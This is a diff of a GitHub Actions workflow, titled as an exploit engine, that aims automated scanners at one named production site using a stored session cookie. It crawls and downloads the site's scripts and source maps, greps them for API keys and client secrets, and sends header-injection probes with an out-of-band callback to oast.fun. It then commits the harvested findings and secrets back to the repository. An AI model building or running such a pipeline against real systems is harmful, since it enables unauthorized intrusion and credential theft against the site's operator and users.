@@ -1,7 +1,7 @@
-name: "Elite Target Exploit Engine — 2026 MAX VERSION"
+name: "Elite Target Exploit 2026 — ULTIMATE"
 
 on:
-  workflow_dispatch: # Focus all power on the target URL manually
+  workflow_dispatch:
 
 permissions:
   contents: write
@@ -9,7 +9,7 @@ permissions:
 
 env:
   TARGET_URL: "https://academy.openai.com/?amp=test"
-  PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
+  TARGET_DOMAIN: "academy.openai.com"
   AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}
 
 jobs:
@@ -18,83 +18,87 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # 10 Parallel Sessions covering all 2025-2026 CVEs and Vulnerability Classes
-        vuln: [sqli, xss, ssti, ssrf, idor, lfi, takeover, exposure, cve2025, cve2026]
+        # Combined scan types: CVEs, Takeovers, Logic, and Secrets
+        vuln_type: [cve2025, cve2026, takeover, header-injection, logic, exposure]
 
     steps:
-      - name: Checkout Repository
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install Arsenal (Nuclei & FFUF)
+      - name: Install Professional Arsenal
         run: |
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          go install github.com/ffuf/ffuf/v2@latest
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          pip install njsscan
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: 🛠 Setup 2026 CVE Templates
+      - name: 🔍 Phase 1:Subdomain & CNAME Analysis
         run: |
-          nuclei -ut
-          # Create a custom wordlist for parameter fuzzing
-          echo "amp" > /tmp/params.txt
-          echo "redirect" >> /tmp/params.txt
-          echo "callback" >> /tmp/params.txt
-          echo "url" >> /tmp/params.txt
-          echo "id" >> /tmp/params.txt
+          # Check if the domain points to a dead service (Subdomain Takeover)
+          nuclei -u "$TARGET_URL" -t http/takeovers/ -o takeover_results.txt || true
 
-      - name: 🎯 FFUF Deep Parameter Fuzzing
-        # This checks if other hidden parameters on the academy page are vulnerable
+      - name: 📂 Phase 2:Code Extraction & SAST
         run: |
-          ffuf -u "https://academy.openai.com/?FUZZ=test" \
-            -w /tmp/params.txt \
+          mkdir -p ./source_code
+          # Crawl and download scripts, source maps, and configs
+          katana -u "$TARGET_URL" -jc -d 3 -em js,json,map,txt -o ./source_code/endpoints.txt
+          
+          # Download discovered files for deep inspection
+          wget -i ./source_code/endpoints.txt -P ./source_code/raw/ || true
+          
+          # Analyze JS for vulnerabilities (XSS, Insecure storage, Logic flaws)
+          njsscan ./source_code/raw/ --sarif -o sast_report.sarif || true
+          
+          # Hunt for OpenAI API Keys or Internal Tokens
+          grep -rE "sk-[a-zA-Z0-9]{32,}|ai_[a-zA-Z0-9_\-]{20,}|access_token|client_secret" ./source_code/raw/ > discovered_secrets.txt || true
+
+      - name: 🛡️ Phase 3:Header & OAST Manipulation
+        run: |
+          # Advanced header injection targeting the 'amp' parameter context
+          nuclei -u "$TARGET_URL" \
+            -t http/vulnerabilities/generic/header-injection.yaml \
             -H "Cookie: $AUTH_COOKIE" \
-            -mc 200,302 -o /tmp/ffuf_results.json || true
+            -H "X-Forwarded-Host: ${{ matrix.vuln_type }}.oast.fun" \
+            -H "X-Custom-IP-Authorization: 127.0.0.1" \
+            -interactsh-server oast.fun \
+            -o header_exploits.txt || true
 
-      - name: ☢️ Nuclei High-Intensity Scan
+      - name: ☢️ Phase 4:High-Intensity CVE Scan
         run: |
           nuclei -u "$TARGET_URL" \
-            -tags ${{ matrix.vuln }} \
-            -severity critical,high,medium,low \
+            -tags ${{ matrix.vuln_type }} \
             -header "Cookie: $AUTH_COOKIE" \
-            -header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBounty-Scanner" \
-            -interactsh-server oast.fun \
-            -rate-limit 100 \
-            -stats \
-            -o /tmp/nuclei_${{ matrix.vuln }}.txt
+            -dast -rl 50 \
+            -o nuclei_final.txt
 
-      - name: 🚨 Instant Alert if Bug Caught
+      - name: 🚨 Unified Alerting System
         if: always()
         run: |
-          if [ -s /tmp/nuclei_${{ matrix.vuln }}.txt ]; then
-            REPORT=$(cat /tmp/nuclei_${{ matrix.vuln }}.txt | head -c 1000)
+          # Check if any findings were generated in any file
+          if [ -s nuclei_final.txt ] || [ -s discovered_secrets.txt ] || [ -s takeover_results.txt ]; then
+            REPORT="### 🚨 Vulnerability Report for $TARGET_DOMAIN\n\n"
+            [ -s takeover_results.txt ] && REPORT+="\n#### Subdomain Takeover:\n\`\`\`\n$(cat takeover_results.txt)\n\`\`\`"
+            [ -s discovered_secrets.txt ] && REPORT+="\n#### Leaked Secrets:\n\`\`\`\n$(cat discovered_secrets.txt)\n\`\`\`"
+            [ -s nuclei_final.txt ] && REPORT+="\n#### Nuclei Hits:\n\`\`\`\n$(cat nuclei_final.txt | head -n 15)\n\`\`\`"
+            
             curl -X POST \
               -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
               -H "Content-Type: application/json" \
               https://api.github.com/repos/${{ github.repository }}/issues \
-              -d "{\"title\":\"🚨 BUG DETECTED: ${{ matrix.vuln }}\",\"body\":\"Target: $TARGET_URL\n\n\`\`\`\n$REPORT\n\`\`\`\"}"
+              -d "{\"title\":\"🚨 CRITICAL FINDING: $TARGET_DOMAIN\",\"body\":\"$REPORT\"}"
           fi
 
-      - name: 💾 Final Intel Persistence (Sync & Save)
+      - name: 💾 Data Persistence
         if: always()
         run: |
           git config --local user.email "bot@hacker.ai"
           git config --local user.name "Exploit-Bot"
-          
-          # Retry loop for parallel Git pushes
-          for i in {1..15}; do
-            git pull origin main --rebase
-            mkdir -p confirmed_findings
-            
-            # Copy findings from /tmp to workspace
-            [ -f /tmp/nuclei_${{ matrix.vuln }}.txt ] && cp /tmp/nuclei_${{ matrix.vuln }}.txt confirmed_findings/
-            [ -f /tmp/ffuf_results.json ] && cp /tmp/ffuf_results.json confirmed_findings/
-            
-            git add confirmed_findings/
-            if git commit -m "Confirmed Intel: ${{ matrix.vuln }} | $(date)"; then
-              git push origin main && break
-            else
-              echo "No new findings for this worker."
-              break
-            fi
-            sleep $(( (RANDOM % 20) + 10 ))
-          done
+          git pull origin main --rebase
+          mkdir -p findings/$TARGET_DOMAIN
+          cp *.txt findings/$TARGET_DOMAIN/ 2>/dev/null || true
+          cp *.sarif findings/$TARGET_DOMAIN/ 2>/dev/null || true
+          git add findings/
+          git commit -m "Exploit Intelligence Update: $(date)" || true
+          git push origin main || true
           
